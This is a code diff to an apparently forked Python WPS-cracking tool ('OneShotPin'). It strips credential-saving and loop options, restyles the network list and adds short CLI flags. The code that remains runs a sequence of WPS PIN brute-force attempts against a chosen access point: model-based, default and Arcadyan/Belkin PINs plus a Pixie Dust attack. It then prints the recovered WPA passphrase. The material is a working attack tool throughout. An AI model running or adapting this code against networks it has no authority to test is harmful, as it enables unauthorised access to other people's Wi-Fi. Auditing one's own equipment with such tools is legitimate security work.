@@ -824,9 +824,8 @@ class ConnectionStatus:
 
 class Companion:
     """Main application part"""
-    def __init__(self, interface, save_result=False, print_debug=False, bssid=''):
+    def __init__(self, interface, print_debug=False, bssid=''):
         self.interface = interface
-        self.save_result = save_result
         self.print_debug = print_debug
 
         self.base_dir = pathlib.Path.cwd()
@@ -847,14 +846,6 @@ class Companion:
 
         self.pixie_creds = PixiewpsData()
         self.connection_status = ConnectionStatus()
-
-        self.sessions_dir = str(self.base_dir / 'sessions')
-        self.pixiewps_dir = str(self.base_dir / 'pixiewps')
-        self.reports_dir = str(self.base_dir / 'reports')
-        if not os.path.exists(self.sessions_dir):
-            os.makedirs(self.sessions_dir)
-        if not os.path.exists(self.pixiewps_dir):
-            os.makedirs(self.pixiewps_dir)
 
         self.generator = WPSpin()
 
@@ -1047,33 +1038,6 @@ class Companion:
         print(f"[+] WPS PIN: {wps_pin}")
         print(f"[+] WPA PSK: {wpa_psk}")
 
-    def __saveResult(self, bssid, essid, wps_pin, wpa_psk):
-        if not os.path.exists(self.reports_dir):
-            os.makedirs(self.reports_dir)
-        filename = os.path.join(self.reports_dir, 'stored')
-        dateStr = datetime.now().strftime("%d.%m.%Y %H:%M")
-        with open(filename + '.txt', 'a', encoding='utf-8') as file:
-            file.write('{}\nBSSID: {}\nESSID: {}\nWPS PIN: {}\nWPA PSK: {}\n\n'.format(
-                        dateStr, bssid, essid, wps_pin, wpa_psk
-                    )
-            )
-        writeTableHeader = not os.path.isfile(filename + '.csv')
-        with open(filename + '.csv', 'a', newline='', encoding='utf-8') as file:
-            csvWriter = csv.writer(file, delimiter=';', quoting=csv.QUOTE_ALL)
-            if writeTableHeader:
-                csvWriter.writerow(['Date', 'BSSID', 'ESSID', 'WPS PIN', 'WPA PSK'])
-            csvWriter.writerow([dateStr, bssid, essid, wps_pin, wpa_psk])
-        print(f'[i] Credentials saved to {filename}.txt, {filename}.csv')
-
-    def __savePin(self, bssid, pin):
-        storage_id = bssid_storage_name(bssid)
-        if not storage_id:
-            return
-        filename = os.path.join(self.pixiewps_dir, f'{storage_id}.run')
-        with open(filename, 'w') as file:
-            file.write(pin)
-        print('[i] PIN saved in {}'.format(filename))
-
     def __prompt_wpspin(self, bssid):
         pins = self.generator.getSuggested(bssid)
         display_bssid = canonical_bssid(bssid).upper() or bssid
@@ -1155,24 +1119,11 @@ class Companion:
             self.sendOnly('WPS_CANCEL')
         return success
 
-    def single_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, pixieforce=False,
-                          store_pin_on_fail=False):
-        storage_id = bssid_storage_name(bssid)
+    def single_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, pixieforce=False):
 
         if pin is None:
             if pixiemode:
-                try:
-                    if not storage_id:
-                        raise FileNotFoundError
-                    filename = os.path.join(self.pixiewps_dir, f'{storage_id}.run')
-                    with open(filename, 'r') as file:
-                        t_pin = file.readline().strip()
-                        if user_input('[?] Use previously calculated PIN {}? [n/Y] '.format(t_pin)).lower() != 'n':
-                            pin = t_pin
-                        else:
-                            raise FileNotFoundError
-                except FileNotFoundError:
-                    pin = self.generator.getLikely(bssid) or '12345670'
+                pin = self.generator.getLikely(bssid) or '12345670'
             elif not pbc_mode:
                 pin = self.__prompt_wpspin(bssid) or '12345670'
         if pbc_mode:
@@ -1183,26 +1134,16 @@ class Companion:
             self.__wps_connection(bssid, pin, pixiemode)
             conn_bssid = getattr(self.connection_status, 'bssid', '')
             bssid = conn_bssid or canonical_bssid(bssid)
-            storage_id = bssid_storage_name(bssid)
 
         if self.connection_status.status == 'GOT_PSK':
             self.__credentialPrint(pin, self.connection_status.wpa_psk, self.connection_status.essid)
-            if self.save_result:
-                self.__saveResult(bssid, self.connection_status.essid, pin, self.connection_status.wpa_psk)
-            if not pbc_mode:
-                if storage_id:
-                    filename = os.path.join(self.pixiewps_dir, f'{storage_id}.run')
-                    try:
-                        os.remove(filename)
-                    except FileNotFoundError:
-                        pass
             return True
         elif pixiemode:
             if self.pixie_creds.got_all() or self.pixie_creds.got_m3_only():
                 pin = self.__runPixiewps(pixieforce)
                 if pin:
                     while True:
-                        if self.single_connection(bssid, pin, pixiemode=False, store_pin_on_fail=True):
+                        if self.single_connection(bssid, pin, pixiemode=False, pixieforce=pixieforce):
                             return True
                         print('[!] Pixie Dust PIN failed, retrying connection…')
                         check_exit()
@@ -1212,8 +1153,6 @@ class Companion:
                 print('[!] Not enough data to run Pixie Dust attack')
                 return False
         else:
-            if store_pin_on_fail:
-                self.__savePin(bssid, pin)
             return False
 
     def __print_with_indicators(self, level, msg):
@@ -1396,22 +1335,16 @@ class WiFiScanner:
         def colored(text, color=None):
             """Returns colored text"""
             palette = {
-                'green': '\033[92m{}\033[00m',
-                'red': '\033[91m{}\033[00m',
-                'yellow': '\033[93m{}\033[00m'
+                'super_dark_gray': '\033[38;5;232m{}\033[00m',
+                'dark_gray': '\033[38;5;236m{}\033[00m',
+                'gray': '\033[38;5;244m{}\033[00m',
+                'white': '\033[97m{}\033[00m'
             }
             return palette.get(color, '{}').format(text)
 
-        if self.vuln_list:
-            print('Network marks: {1} {0} {2} {0} {3}'.format(
-                '|',
-                colored('Possibly vulnerable', color='green'),
-                colored('WPS locked', color='red'),
-                colored('Algorithmic or known PINs', color='yellow')
-            ))
         print('Networks list:')
-        print('{:<4} {:<18} {:<25} {:<27} {:<}'.format(
-            '#', 'BSSID', 'ESSID (Signal)', 'WSC device name', 'WSC model'))
+        print('{:<4} {:<26} {:<25} {:<}'.format(
+            '#', 'BSSID (Signal)', 'ESSID', 'WSC device'))
 
         network_list_items = list(network_list.items())
         if self.reverse:
@@ -1419,32 +1352,32 @@ class WiFiScanner:
         for n, network in network_list_items:
             number = f'{n})'
             model = '{} {}'.format(network['Model'], network['Model number'])
-            essid_sig = f"{network.get('ESSID', 'HIDDEN')} ({network['Level']})"
-            essid = truncateStr(essid_sig, 25)
-            device_name = truncateStr(network['Device name'], 27)
+            bssid_sig = f"{network['BSSID']} ({network['Level']})"
+            essid = truncateStr(network.get('ESSID', 'HIDDEN'), 25)
+            device_info = truncateStr(f"{network['Device name']} {model}", 40)
 
             processed_number = truncateStr(number, 4)
-            processed_bssid = truncateStr(network['BSSID'], 18)
+            processed_bssid = truncateStr(bssid_sig, 26)
 
             line = ' '.join([
                 processed_number,
                 processed_bssid,
                 essid,
-                device_name,
-                model
+                device_info
             ])
 
             if network['WPS locked']:
-                print(colored(line, color='red'))
+                color = 'super_dark_gray'
             else:
                 model_pins = generate_model_pins(mac=network['BSSID'], ssid=network.get('ESSID'), model=network['Model'], device=network['Device name'])
                 suggested_pins = generate_suggested_pins(network['BSSID'])
                 if model_pins or suggested_pins:
-                    print(colored(line, color='yellow'))
+                    color = 'gray'
                 elif self.vuln_list and (model in self.vuln_list):
-                    print(colored(line, color='green'))
+                    color = 'white'
                 else:
-                    print(line)
+                    color = 'dark_gray'
+            print(colored(line, color=color))
 
         return network_list
 
@@ -1628,20 +1561,17 @@ def try_pin_sequence(comp, bssid, pins, pixie=False, delay=None):
     return False
 def build_parser():
     parser = argparse.ArgumentParser(description='OneShotPin 0.0.2 (c) 2017 rofl0r, modded by drygdryg', epilog='Example: %(prog)s --interface wlan0 --bssid 00:90:4C:C1:AC:21')
-    parser.add_argument('--interface', type=str, required=True, help='Name of the interface to use')
-    parser.add_argument('--bssid', type=str, help='BSSID of the target AP')
+    parser.add_argument('-i', '--interface', type=str, required=True, help='Name of the interface to use')
+    parser.add_argument('-b', '--bssid', type=str, help='BSSID of the target AP')
     parser.add_argument(
-        '--pin',
+        '-p', '--pin',
         type=str,
         help='Use the specified pin (arbitrary string or 4/8 digit pin; requires --bssid)')
-    parser.add_argument('--push-button-connect', action='store_true', help='Run WPS push button connection')
-    parser.add_argument('--delay', type=float, help='Set the delay between pin attempts')
-    parser.add_argument('--write', action='store_true', help='Write credentials to the file on success')
-    parser.add_argument('--iface-down', action='store_true', help='Down network interface when the work is finished')
-    parser.add_argument('--loop', action='store_true', help='Run in a loop')
-    parser.add_argument('--reverse-scan', action='store_true', help='Reverse order of networks in the list of networks. Useful on small displays')
-    parser.add_argument('--mtk-wifi', action='store_true', help='Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit (for internal Wi-Fi adapters implemented in MediaTek SoCs). Turn off Wi-Fi in the system settings before using this.')
-    parser.add_argument('--verbose', action='store_true', help='Verbose output')
+    parser.add_argument('-P', '--push-button-connect', action='store_true', help='Run WPS push button connection')
+    parser.add_argument('-d', '--delay', type=float, help='Set the delay between pin attempts')
+    parser.add_argument('-r', '--reverse-scan', action='store_true', help='Reverse order of networks in the list of networks. Useful on small displays')
+    parser.add_argument('-m', '--mtk-wifi', action='store_true', help='Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit (for internal Wi-Fi adapters implemented in MediaTek SoCs). Turn off Wi-Fi in the system settings before using this.')
+    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
     parser.set_defaults(pixie_dust=True, pixie_force=True)
     return parser
 
@@ -1663,51 +1593,42 @@ if __name__ == '__main__':
     if not ifaceUp(args.interface):
         die('Unable to up interface "{}"'.format(args.interface))
 
-    force_loop = args.loop or args.push_button_connect
     companion = None
 
     try:
-        while True:
-            check_exit()
-            companion = Companion(args.interface, args.write, print_debug=args.verbose)
-            if args.push_button_connect:
-                companion.single_connection(args.bssid, pbc_mode=True)
-            else:
-                essid = None
-                network = None
-                if not args.bssid:
-                    scanner = WiFiScanner(args.interface, vuln_list, args.reverse_scan)
-                    network = scanner.prompt_network()
-                    if network:
-                        args.bssid = network['BSSID']
-                        essid = network.get('ESSID')
-                if args.bssid:
-                    companion = Companion(args.interface, args.write, print_debug=args.verbose)
-                    if args.pin:
-                        companion.single_connection(args.bssid, args.pin, args.pixie_dust, args.push_button_connect, args.pixie_force)
-                    else:
-                        model = network.get('Model', '') + network.get('Model number', '') if network else ''
-                        device = network.get('Device name', '') if network else ''
-                        if not try_pin_sequence(companion, args.bssid, generate_model_pins(mac=args.bssid, ssid=essid, model=model, device=device), delay=args.delay):
-                            if args.pixie_dust:
-                                print('[*] Trying Pixie Dust attack...')
-                                companion.single_connection(args.bssid, None, pixiemode=True, pixieforce=args.pixie_force)
-                            if companion.connection_status.status != 'GOT_PSK':
-                                if not try_pin_sequence(companion, args.bssid, generate_suggested_pins(args.bssid), delay=args.delay):
-                                    if not try_pin_sequence(companion, args.bssid, DEFAULT_PINS, delay=args.delay):
-                                        pins = generate_pins(mac=args.bssid, ssid=essid)
-                                        if not try_pin_sequence(companion, args.bssid, pins, delay=args.delay):
-                                            if not try_pin_sequence(companion, args.bssid, [p for p in [arcadyan_pin(args.bssid)] if p], delay=args.delay):
-                                                if not try_pin_sequence(companion, args.bssid, [p for p in [belkin_pin(args.bssid)] if p], delay=args.delay):
-                                                    print('[-] All PIN attempts failed')
-            if not force_loop:
-                break
-            if args.loop:
-                args.bssid = None
+        check_exit()
+        companion = Companion(args.interface, print_debug=args.verbose)
+        if args.push_button_connect:
+            companion.single_connection(args.bssid, pbc_mode=True)
+        else:
+            essid = None
+            network = None
+            if not args.bssid:
+                scanner = WiFiScanner(args.interface, vuln_list, args.reverse_scan)
+                network = scanner.prompt_network()
+                if network:
+                    args.bssid = network['BSSID']
+                    essid = network.get('ESSID')
+            if args.bssid:
+                if args.pin:
+                    companion.single_connection(args.bssid, args.pin, args.pixie_dust, args.push_button_connect, args.pixie_force)
+                else:
+                    model = network.get('Model', '') + network.get('Model number', '') if network else ''
+                    device = network.get('Device name', '') if network else ''
+                    if not try_pin_sequence(companion, args.bssid, generate_model_pins(mac=args.bssid, ssid=essid, model=model, device=device), delay=args.delay):
+                        if args.pixie_dust:
+                            print('[*] Trying Pixie Dust attack...')
+                            companion.single_connection(args.bssid, None, pixiemode=True, pixieforce=args.pixie_force)
+                        if companion.connection_status.status != 'GOT_PSK':
+                            if not try_pin_sequence(companion, args.bssid, generate_suggested_pins(args.bssid), delay=args.delay):
+                                if not try_pin_sequence(companion, args.bssid, DEFAULT_PINS, delay=args.delay):
+                                    pins = generate_pins(mac=args.bssid, ssid=essid)
+                                    if not try_pin_sequence(companion, args.bssid, pins, delay=args.delay):
+                                        if not try_pin_sequence(companion, args.bssid, [p for p in [arcadyan_pin(args.bssid)] if p], delay=args.delay):
+                                            if not try_pin_sequence(companion, args.bssid, [p for p in [belkin_pin(args.bssid)] if p], delay=args.delay):
+                                                print('[-] All PIN attempts failed')
     except KeyboardInterrupt:
         print('\nAborting…')
     finally:
         if companion:
             companion.cleanup()
-        if args.iface_down:
-            ifaceUp(args.interface, down=True)
